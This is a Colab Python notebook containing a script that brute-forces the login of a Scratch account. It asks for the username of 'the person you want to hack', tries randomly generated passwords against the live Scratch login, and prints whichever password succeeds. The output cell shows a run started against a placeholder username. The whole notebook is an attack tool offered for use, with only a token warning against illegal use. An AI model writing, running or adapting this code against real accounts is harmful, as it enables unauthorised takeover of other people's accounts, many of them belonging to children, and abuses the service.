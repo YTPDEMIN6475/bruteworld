{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Scratch-Bruteforce.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyPdtOq3b//rm8yUNUg8qc08",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/NarmakTwo/scratch-bruteforce/blob/main/Scratch_Bruteforce.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "fe87IeJQgHX9",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "82a4afa2-334b-4fc3-8b2d-bc30f473ad9a"
      },
      "source": [
        "# Comments\n",
        "\n",
        "# If you are wondering what '\\033[93' is,\n",
        "# they just change the color of the text\n",
        "\n",
        "\n",
        "#imports\n",
        "import os\n",
        "try:\n",
        "  from scratchclient import ScratchSession as s\n",
        "except:\n",
        "  os.system('pip install scratchclient')\n",
        "  os.system('clear')\n",
        "import random\n",
        "\n",
        "# Program\n",
        "print('Brute-force is ready')\n",
        "print('This will take some time')\n",
        "print('\\n\\033[93mWarning: DO NOT USE THIS FOR ILLEGAL PURPOSES')\n",
        "loop = True\n",
        "while loop == True:\n",
        "  ic = input('\\n\\033[0mContinue? (Y/n) ')\n",
        "  if ic == 'n':\n",
        "    exit(0)\n",
        "  elif ic == 'Y':\n",
        "    start = True\n",
        "    os.system('clear')\n",
        "    loop = False\n",
        "  else:\n",
        "    loop = True\n",
        "\n",
        "debug = False\n",
        "mdebug = False\n",
        "\n",
        "# ask for the username\n",
        "susername = input('What is the scratch username of the person you want to hack? ')\n",
        "os.system('clear')\n",
        "print('Brute-force started')\n",
        "\n",
        "# list for brute-force to choose from\n",
        "alpb = 'A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z ~ ! @ # $ % ^ & * ( ) _ + - = [ ] { } : ; \\' \" \\\\ | , . < > / ? ` 1 2 3 4 5 6 7 8 9'.split(' ')\n",
        "\n",
        "# make a class for the password to be in\n",
        "class rpassc:\n",
        "  rpass = ''\n",
        "\n",
        "\n",
        "# make a class for debug\n",
        "class numc:\n",
        "  num = 1\n",
        "  mnum = 1\n",
        "\n",
        "# repeat until password found\n",
        "on = True\n",
        "while on:\n",
        "  # make a list for the charecters of the password to be added to\n",
        "  tpass = []\n",
        "  # generate a random password\n",
        "  for i in range(0, random.randint(8, 25)):\n",
        "    tpass.append(random.choice(alpb))\n",
        "    if mdebug == True:\n",
        "      print(f'Password gen at character {numc.num}.{numc.mnum} Done with value {tpass[i]}')\n",
        "      numc.mnum += 1\n",
        "  tpass = \"\".join(str(x) for x in tpass)\n",
        "  # try to login with the generated password\n",
        "  try:\n",
        "    scratch = s(susername, tpass)\n",
        "    rpassc.rpass = tpass\n",
        "  # if the password is correct, stop the loop\n",
        "    on = False \n",
        "  except:\n",
        "  # if password is wrong, repeat the process\n",
        "    on = True\n",
        "  if debug == True:   \n",
        "    print(f'Cycle number {numc.num} Done with password {tpass}')\n",
        "    numc.mnum = 1\n",
        "    numc.num += 1\n",
        "# when the loop is done AKA when the password is correct, display it to the user\n",
        "print('\\n\\nBrute-force is done.')\n",
        "print(f'The password is {rpassc.rpass}')"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Brute-force is ready\n",
            "This will take some time\n",
            "\n",
            "\u001b[93mWarning: DO NOT USE THIS FOR ILLEGAL PURPOSES\n",
            "\n",
            "\u001b[0mContinue? (Y/n) Y\n",
            "What is the scratch username of the person you want to hack? USERNAME TO HACK\n",
            "Brute-force started\n"
          ]
        }
      ]
    }
  ]
}
